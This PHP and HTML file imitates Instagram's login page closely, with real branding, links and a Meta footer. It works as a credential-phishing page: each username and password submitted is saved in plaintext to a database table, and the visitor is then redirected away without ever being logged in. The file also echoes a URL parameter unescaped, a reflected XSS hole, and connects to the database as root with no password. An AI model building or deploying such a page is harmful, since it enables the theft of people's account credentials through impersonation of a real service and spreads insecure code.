<?php
// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "instagram_clone";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$error_message = "";
$success_message = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Insert user data into the database without checking for existing username
    $insert_sql = "INSERT INTO users (username, password) VALUES (?, ?)";
    $insert_stmt = $conn->prepare($insert_sql);
    $insert_stmt->bind_param("ss", $username, $password);

    if ($insert_stmt->execute()) {
        // Redirect to Instagram
        header("Location: ./about.html");
        exit(); // Prevent further script execution
    } else {
        $error_message = "Error: " . $insert_stmt->error;
    }
    
    $insert_stmt->close();
    
}

if (isset($_GET['success_message'])) {
    $success_message = $_GET['success_message'];
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <link rel="icon" href="Instagram_icon.svg" type="image/svg+xml">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="styles.css">
    <title>Instagram</title>
</head>

<body>
    <div class="container">
        <div class="language-selector">
            <select aria-label="Switch Display Language">
                <option value="af">English</option>
                <option value="cs">Čeština</option>
                <option value="da">Dansk</option>
                <option value="de">Deutsch</option>
                <option value="el">Ελληνικά</option>
                <option value="en">English</option>
                <!-- Add more language options -->
            </select>
        </div>
        <div class="logo">
            <img src="Instagram_logo.svg" alt="Instagram">
        </div>

        <?php if (!empty($error_message)) : ?>
            <div class="error-message"><?php echo $error_message; ?></div>
        <?php endif; ?>

        <?php if (!empty($success_message)) : ?>
            <div class="success-message"><?php echo $success_message; ?></div>
        <?php endif; ?>

        <form method="POST" action="">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="login-button">Log in</button>
        </form>
        <div class="divider">
            <span>OR</span>
        </div>
        <button class="facebook-login">
            <a href="https://www.facebook.com/login" class="facebook-login">
                <i class="fab fa-facebook" style="width: 16px; margin-right: 8px; vertical-align: middle;"></i>
                Log in with Facebook
            </a>
        </button>

        <div class="forgot-password">
            <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
        </div>
        <div class="signup">
            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </div>

        <div class="get-app">
            Get the app.
        </div>
        <div class="app-stores">
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                <img src="googleplay.svg" alt="Get it on Google Play">
            </a>
            <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
                <img src="appstore.svg" alt="Download on the App Store">
            </a>
        </div>
    </div>

    <footer>
        <div class="footer-content">
            <div class="terms">
                By continuing, you agree to Instagram's
                <a href="https://help.instagram.com/581066165581870/" target="_blank" class="terms-link">Terms of Use</a>
                and
                <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect/" target="_blank" class="privacy-link">Privacy Policy</a>.
            </div>

            <br>
            <nav>
                <ul>
                    <li><a href="https://about.instagram.com/">About</a></li>
                    <li><a href="https://about.instagram.com/blog">Blog</a></li>
                    <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
                    <li><a href="https://help.instagram.com/">Help</a></li>
                    <li><a href="https://developers.facebook.com/docs/instagram-platform">API</a></li>
                    <li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a></li>
                    <li><a href="https://help.instagram.com/581066165581870/">Terms</a></li>
                    <li><a href="https://www.threads.net/">Threads</a></li>
                    <li><a href="https://www.instagram.com/privacy/cookie_settings/">Cookie Settings</a></li>
                    <li><a href="https://www.instagram.com/explore/locations/">Locations</a></li>
                </ul>
            </nav>

            <div class="meta">
                from <br>
                <img src="meta_logo.svg" alt="Meta" style="width: 70px; vertical-align: middle;">
            </div>
        </div>
    </footer>
</body>

</html>
